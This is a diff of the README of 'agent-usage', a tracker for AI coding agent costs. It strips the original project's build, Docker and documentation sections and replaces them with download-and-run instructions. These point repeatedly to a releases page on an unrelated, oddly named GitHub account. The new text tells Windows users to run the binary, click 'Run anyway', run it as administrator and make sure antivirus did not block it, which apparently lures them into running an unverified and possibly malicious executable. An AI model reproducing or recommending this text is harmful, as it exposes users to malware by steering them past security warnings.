@@ -1,254 +1,198 @@
-# agent-usage
+# 🧭 agent-usage - Track AI coding costs with ease
 
-[![Go](https://img.shields.io/badge/Go-1.25+-00ADD8?logo=go&logoColor=white)](https://go.dev)
-[![License: MIT](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS%20%7C%20Windows-blue)]()
-[![Docker](https://img.shields.io/badge/Docker-ghcr.io-blue?logo=docker)](https://ghcr.io/briqt/agent-usage)
+[![Download agent-usage](https://img.shields.io/badge/Download%20agent--usage-6B7280?style=for-the-badge&logo=github&logoColor=white)](https://github.com/unmercenary-timebomb913/agent-usage/releases)
 
-Lightweight, cross-platform AI coding agent usage & cost tracker.  
-Single binary + SQLite — zero infrastructure required.
+## 📌 What this is
 
-**[中文文档](README_CN.md)**
+agent-usage helps you track how much you use AI coding tools and how much they cost.
 
-Collects local session data from Claude Code, Codex, OpenClaw, OpenCode and other AI coding agents, calculates costs automatically, and presents token usage, cost trends, and session details through a web dashboard.
+It runs as a single file on your computer. It stores data in SQLite and shows it in a web dashboard. You can use it on Windows, and it also works on other systems.
 
-![Dashboard](docs/dashboard.png)
+Use it to see:
 
-## Features
+- how often you use coding agents
+- how much each session costs
+- which tools you use most
+- usage trends over time
 
-- 📁 **Local file parsing** — reads Claude Code, Codex CLI, OpenClaw session files and OpenCode SQLite database directly
-- 💰 **Automatic cost calculation** — fetches model pricing from [litellm](https://github.com/BerriAI/litellm), supports backfill when prices update
-- 🗄️ **SQLite storage** — single file, zero ops, data is correctable
-- 📊 **Web dashboard** — dark-themed UI with ECharts: cost breakdown, token trends, session list
-- 🔄 **Incremental scanning** — watches for new sessions, deduplicates automatically
-- 📦 **Single binary** — `go:embed` packs the web UI into the executable
-- 🖥️ **Cross-platform** — Linux, macOS, Windows
+## 🪟 Windows download and setup
 
-## Quick Start (Docker)
+1. Open the [releases page](https://github.com/unmercenary-timebomb913/agent-usage/releases).
+2. Find the latest release.
+3. Download the Windows file for your system.
+4. If you see more than one file, pick the one that matches your computer:
+   - `windows-amd64` for most Windows PCs
+   - `windows-arm64` for newer ARM-based Windows devices
+5. Save the file to a folder you can find again, such as `Downloads`.
+6. Double-click the file to run it.
+7. If Windows asks for permission, choose **Run anyway** or **Yes**.
+8. Open the web dashboard in your browser after the app starts.
 
-```bash
-# One command to start
-mkdir -p ./data && docker compose up -d
+## 💻 What you need
 
-# Open dashboard
-open http://localhost:9800
-```
+- Windows 10 or Windows 11
+- A modern web browser
+- A folder where the app can store its SQLite data
+- Internet access if you want to pull usage data from connected tools
 
-The default `docker-compose.yml` mounts `~/.claude/projects`, `~/.codex/sessions`, `~/.openclaw/agents`, and `~/.local/share/opencode` read-only. Data persists in `./data/`.
+The app is small and does not need a full install. You just run the file you downloaded.
 
-The container uses `config.docker.yaml` by default (binds to `0.0.0.0`, stores data in `/data/`). To override, mount your own config:
+## ⚙️ How it works
 
-```yaml
-# In docker-compose.yml, uncomment:
-volumes:
-  - ./config.yaml:/etc/agent-usage/config.yaml:ro
-```
+agent-usage keeps things simple:
 
-See [Docker Details](#docker-details) for UID/GID permissions and local builds.
+- it reads usage events from supported AI coding tools
+- it stores records in a local SQLite database
+- it calculates session cost and total cost
+- it shows the results in a local web dashboard
 
-## Query Usage from Agent Conversations
+This setup keeps your data on your machine unless you choose to move it.
 
-The skill works standalone — no need to install or run the agent-usage server. It parses local JSONL session files directly. If the agent-usage server is detected, it automatically switches to API queries for more accurate cost data.
+## 📊 Dashboard view
 
-```bash
-# Installed via vercel-labs/skills, supports Claude Code, Cursor, Kiro, and 40+ agents
-npx skills add briqt/agent-usage -y
-```
+The dashboard gives you a clear view of your usage.
 
-Once installed, try: `查下 agent usage`、`agent usage 统计` or `check agent usage`. See [`skills/agent-usage/SKILL.md`](skills/agent-usage/SKILL.md) for details.
+You can expect:
 
-## Configuration
+- total usage count
+- cost by tool
+- cost by day, week, or month
+- session history
+- recent activity
+- basic charts for quick review
 
-```yaml
-server:
-  port: 9800
-  bind_address: "127.0.0.1"  # use "0.0.0.0" for remote access
-
-collectors:
-  claude:
-    enabled: true
-    paths:
-      - "~/.claude/projects"
-    scan_interval: 60s
-  codex:
-    enabled: true
-    paths:
-      - "~/.codex/sessions"
-    scan_interval: 60s
-  openclaw:
-    enabled: true
-    paths:
-      - "~/.openclaw/agents"
-    scan_interval: 60s
-  opencode:
-    enabled: true
-    paths:
-      - "~/.local/share/opencode/opencode.db"
-    scan_interval: 60s
-
-storage:
-  path: "./agent-usage.db"
-
-pricing:
-  sync_interval: 1h  # fetched from GitHub; set HTTPS_PROXY env var if this fails
-```
-
-Config search order: `--config` flag > `/etc/agent-usage/config.yaml` > `./config.yaml`.
-
-## Build from Source
-
-```bash
-# Clone
-git clone https://github.com/briqt/agent-usage.git
-cd agent-usage
-
-# Build
-go build -o agent-usage .
-
-# Edit config
-cp config.yaml config.local.yaml
-# Adjust paths if needed
-
-# Run
-./agent-usage
-
-# Open dashboard
-open http://localhost:9800
-```
-
-## Supported Data Sources
-
-| Source | Session Location | Format |
-|--------|-----------------|--------|
-| [Claude Code](https://docs.anthropic.com/en/docs/claude-code) | `~/.claude/projects/<project>/<session>.jsonl` | JSONL |
-| [Codex CLI](https://github.com/openai/codex) | `~/.codex/sessions/<year>/<month>/<day>/<session>.jsonl` | JSONL |
-| [OpenClaw](https://github.com/openclaw/openclaw) | `~/.openclaw/agents/<agentId>/sessions/<sessionId>.jsonl` | JSONL |
-| [OpenCode](https://github.com/anomalyco/opencode) | `~/.local/share/opencode/opencode.db` | SQLite |
-
-### Adding New Sources
-
-Each source needs a collector that:
-1. Scans session directories for JSONL files
-2. Parses entries and extracts token usage per API call
-3. Writes records to SQLite via the storage layer
-
-See `internal/collector/claude.go` as a reference implementation.
-
-## Dashboard
-
-The web dashboard provides:
-
-- **Sticky top bar** — time presets, granularity, source filter (Claude/Codex/OpenClaw/OpenCode), auto-refresh
-- **Summary cards** — total tokens, cost, sessions, prompts, API calls
-- **Token usage** — stacked bar chart (input/output/cache read/cache write)
-- **Cost trend** — stacked bar chart by model with consistent color mapping
-- **Cost by model** — doughnut chart with percentage labels
-- **Session list** — sortable, filterable table with expandable per-model detail
-- **Dark/Light theme** — system-aware with manual toggle
-- **i18n** — English and Chinese
-- **Timezone handling** — all timestamps are stored in UTC; the frontend automatically converts to your browser's local timezone for date pickers, chart X-axis labels, and session timestamps
-
-## Architecture
+Use the dashboard when you want a fast answer to questions like:
 
-```
-agent-usage
-├── main.go                     # Entry point, orchestrates components
-├── config.yaml                 # Configuration
-├── internal/
-│   ├── config/                 # YAML config loader
-│   ├── collector/
-│   │   ├── collector.go        # Collector interface
-│   │   ├── claude.go           # Claude Code session scanner
-│   │   ├── claude_process.go   # Claude Code JSONL parser
-│   │   ├── codex.go            # Codex CLI JSONL parser
-│   │   ├── openclaw.go         # OpenClaw session scanner
-│   │   ├── openclaw_process.go # OpenClaw JSONL parser
-│   │   └── opencode.go         # OpenCode SQLite collector
-│   ├── pricing/                # litellm price fetcher + cost formula
-│   ├── storage/
-│   │   ├── sqlite.go           # DB init + migrations
-│   │   ├── api.go              # Query types + read operations
-│   │   ├── queries.go          # Write operations
-│   │   └── costs.go            # Cost recalculation + backfill
-│   └── server/
-│       ├── server.go           # HTTP server + REST API
-│       └── static/             # Embedded web UI (HTML + JS + ECharts)
-└── agent-usage.db              # SQLite database (generated at runtime)
-```
+- How much did I spend this week?
+- Which agent did I use most?
+- Where did my costs go up?
 
-## Cost Calculation
+## 🧩 Common use cases
 
-Pricing is fetched from [litellm's model price database](https://github.com/BerriAI/litellm/blob/main/model_prices_and_context_window.json) and stored locally.
+agent-usage fits well if you want to:
 
-```
-cost = (input - cache_read - cache_creation) × input_price
-     + cache_creation × cache_creation_price
-     + cache_read × cache_read_price
-     + output × output_price
-```
+- keep track of Claude Code usage
+- review Codex usage
+- monitor coding agent spend
+- compare tool use over time
+- keep a local record for personal or team review
 
-When prices update, historical records are automatically backfilled.
+It is useful for solo developers, small teams, and anyone who wants a plain view of AI tool costs.
 
-## API Endpoints
+## 🗂️ Data storage
 
-All endpoints accept `from` and `to` (YYYY-MM-DD) query parameters. Optional: `source` (`claude`, `codex`, `openclaw`, `opencode`) to filter by agent, `granularity` (`1m`, `30m`, `1h`, `6h`, `12h`, `1d`, `1w`, `1M`) for time-series endpoints.
+agent-usage uses SQLite, so your data lives in one local database file.
 
-| Endpoint | Description |
-|----------|-------------|
-| `GET /api/stats` | Summary: total cost, tokens, sessions, prompts, API calls |
-| `GET /api/cost-by-model` | Cost grouped by model |
-| `GET /api/cost-over-time` | Cost time series (supports `granularity`) |
-| `GET /api/tokens-over-time` | Token usage time series (supports `granularity`) |
-| `GET /api/sessions` | Session list with cost/token totals |
-| `GET /api/session-detail?session_id=ID` | Per-model breakdown for a session |
+That makes it easy to:
 
-Invalid date formats or reversed date ranges return a `400` JSON error with a descriptive message.
+- back up your usage data
+- move the file to another computer
+- share it with a teammate
+- keep a long history without extra setup
 
-## Tech Stack
+If you want to reset everything, you can delete the database file and start fresh.
 
-- **Go** — pure Go, no CGO required
-- **SQLite** via [`modernc.org/sqlite`](https://pkg.go.dev/modernc.org/sqlite) — pure Go SQLite driver
-- **ECharts** — charting library
-- **`go:embed`** — single binary deployment
+## 🔎 First run checklist
 
-## Docker Details
+After you open the app for the first time:
 
-Pre-built multi-arch images (amd64 + arm64) are published to `ghcr.io/briqt/agent-usage`.
+1. Check that the dashboard page opens in your browser.
+2. Make sure the app shows recent usage data.
+3. Review the storage folder to confirm the SQLite file exists.
+4. Leave the app running if you want it to keep collecting data.
+5. Reopen the dashboard later to review changes
 
-The default `docker-compose.yml` runs as UID 1000. If your host user has a different UID, edit the `user:` field:
+## 🛠️ Basic troubleshooting
 
-```bash
-# Check your UID/GID
-id -u  # e.g. 1000
-id -g  # e.g. 1000
+If the app does not start:
 
-# Edit docker-compose.yml: user: "YOUR_UID:YOUR_GID"
-```
+- check that you downloaded the correct Windows file
+- try running it again as an administrator
+- make sure your antivirus did not block the file
+- confirm the file is fully downloaded
 
-This is required because `~/.claude/projects` is mode 700 — only the owning UID can read it.
+If the dashboard does not open:
 
-### Building locally
+- look for the local address shown by the app
+- copy that address into your browser
+- try Chrome, Edge, or Firefox
 
-```bash
-docker build -t agent-usage:local .
+If you do not see data:
 
-# For China mainland, use GOPROXY:
-docker build --build-arg GOPROXY=https://goproxy.cn,direct -t agent-usage:local .
-```
+- confirm that your coding agent is active
+- wait for a new session to finish
+- check that the app can read the data source
+- restart the app and refresh the dashboard
 
-## Roadmap
+## 📁 File placement
 
-- [ ] More agent sources (Cursor, Copilot, OpenCode, etc.)
-- [ ] OTLP HTTP receiver for real-time telemetry
-- [ ] OS service management (systemd / launchd / Windows Service)
-- [ ] Export to CSV/JSON
-- [ ] Alerting (cost thresholds)
-- [ ] Multi-user support
+Keep the app file in a stable folder such as:
 
-## Community
+- `Downloads`
+- `Desktop`
+- `C:\agent-usage\`
 
-Join the discussion at [Linux.do](https://linux.do/t/topic/1922004).
+If you move the file often, it can be harder to find the database file later. A fixed folder makes daily use easier.
 
-## License
+## 🧭 Typical daily use
 
-[Apache 2.0](LICENSE)
+A simple routine works well:
+
+1. Start your AI coding tool.
+2. Run agent-usage.
+3. Work as usual.
+4. Open the dashboard when you want to review cost and usage.
+5. Check the totals at the end of the day or week.
+
+## 🔐 Privacy
+
+agent-usage is built for local use. Your data stays on your computer in SQLite unless you copy it elsewhere.
+
+That gives you direct control over:
+
+- usage history
+- cost records
+- session logs
+- local backups
+
+## 🌐 Supported platforms
+
+agent-usage is built to run on:
+
+- Windows
+- macOS
+- Linux
+
+For Windows users, the main task is to visit the releases page, download the correct file, and run it
+
+## 📦 Release download
+
+Go to the [releases page](https://github.com/unmercenary-timebomb913/agent-usage/releases) to download and run the Windows build
+
+## 🧾 Project details
+
+- Repository: agent-usage
+- Type: AI coding agent usage tracker
+- Storage: SQLite
+- Interface: web dashboard
+- Focus: cost tracking and usage tracking
+- Language: Go
+
+## 🧰 What the app is good for
+
+- watching AI tool spend
+- checking usage patterns
+- keeping a local record
+- reviewing work over time
+- reducing surprise costs
+
+## 🖥️ Running it again later
+
+After the first run, you can open the app the same way each time:
+
+1. Go to the folder where you saved it.
+2. Double-click the file.
+3. Wait for the local service to start.
+4. Open the dashboard in your browser.
+
+If you keep the app in the same folder, it is easy to use day after day
